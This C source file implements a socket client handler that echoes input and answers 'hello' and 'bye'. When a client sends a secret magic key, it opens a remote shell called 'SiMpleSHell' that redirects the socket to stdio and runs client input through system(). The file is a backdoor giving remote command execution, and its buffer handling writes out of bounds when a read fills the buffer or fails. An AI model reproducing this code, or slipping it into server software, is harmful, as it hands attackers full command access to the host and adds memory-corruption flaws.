/*
 * Handle Clients - hdl_client.c
 *
 * Handle all clients that connect and
 * disconnect.
 *
 ******************************************************/

/* Includes */
#include "hdl_client.h"

/*
 * Close on error function
 */
void
close_error (char *message, int ret_val, int *socket)
{
	perror (message);
	close (*socket);
	exit (ret_val);
}

/*
 * Handle commands and echo function
 */
int
handle_commands(int *sockfd)
{
	int status = 0;
	ssize_t bytes;
	char command[128];

	write (*sockfd, "Say exit to quit SiMpleSHell [SMSH]!\n\n", 38);
	while (status == 0)
    {
  		bzero (command, sizeof (command));
  		if (write (*sockfd, "SM-SH >> ", 9) != 9)
        {
    		  close_error ("Error", 1, sockfd);
    		}

		  bytes = read (*sockfd, command, sizeof (command));
		  command[bytes] = '\0';
		  strip_special (command);

		  if (bytes < 0)
        {
			    status=-2;
		    }
      else if (bytes == 0)
        {
			    status=-1;
		    }

		  if (strcmp (command, "exit") == 0) {
			    status=1;
		    }
		dup2(*sockfd, 0);
		dup2(*sockfd, 1);
		dup2(*sockfd, 2);
		if (system(command) < 0) {
			write(*sockfd, "System error!\n", 14);
		}
		else {
			write(*sockfd, "Done...\n", 8);
		}
	  }

	fflush (stdout);
	return (status);
}

/*
 * Handle multiple sockets function
 */
int
handle_socket(int *sockfd)
{
	ssize_t bytes;
	char buffer[256];
	char command[256];

	bzero (buffer, sizeof (buffer));
	bzero (command, sizeof (command));

	while ((bytes = read (*sockfd, buffer, sizeof (buffer))) > 0)
    {
		  buffer[bytes] = '\0';
		  strcpy (command, buffer);
		  strip_special (command);

		  if(strcmp (command, MAGICKEY) == 0)
        {
			    handle_commands (sockfd);
		    }
      else if(strcmp (command, "hello") == 0)
        {
			    write (*sockfd, WELCOME, strlen (WELCOME));
		    }
      else if(strcmp (command, "bye") == 0)
        {
    			write (*sockfd, SEEYOU, strlen (SEEYOU));
    			close (*sockfd);
    		}
      else
        {
			    if (write (*sockfd, buffer, sizeof (buffer)) != sizeof (buffer))
            {
				      close_error ("Buffer Overflow", -1, sockfd);
  			    }
		    }

		bzero (buffer, sizeof (buffer));
		bzero (command, sizeof (command));
	}

	fflush (stdout);
	return (0);
}
